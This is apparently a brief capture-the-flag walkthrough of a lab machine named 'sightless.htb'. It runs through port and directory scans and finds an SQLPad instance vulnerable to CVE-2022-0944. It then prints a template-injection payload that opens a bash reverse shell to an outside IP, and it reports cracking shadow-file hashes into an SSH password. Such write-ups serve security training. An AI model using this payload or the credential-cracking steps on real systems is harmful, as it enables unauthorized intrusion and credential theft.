Started a nmap scan 
```
21 ftp
22 OpenSSH 8.9p1
80 nginx 1.18.0
```
There is also a domain we need to add to `/etc/hosts` `sightless.htb` 
Doing a subdomain scan did not find any subdomains looking in the source code `sqlpad` 
Doing a nikto scan now and a gobuster scan nikto did not find anything
```
/images
/index.html
```
The SQLpad is running version `6.10.0` which has a vulnerability in it `CVE-2022-0944` after testing for a while I got the reverse shell
`{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.13/1340 0>&1"')}}`
and it says we are a root user and we can read the shadow file so why not try and crack the hashes I cracked both and tried to login as `michael:insaneclownposse` and we got ssh access to the main server now

Possible Usernames
```
admin@sightless.htb
john@sightless.htb
```
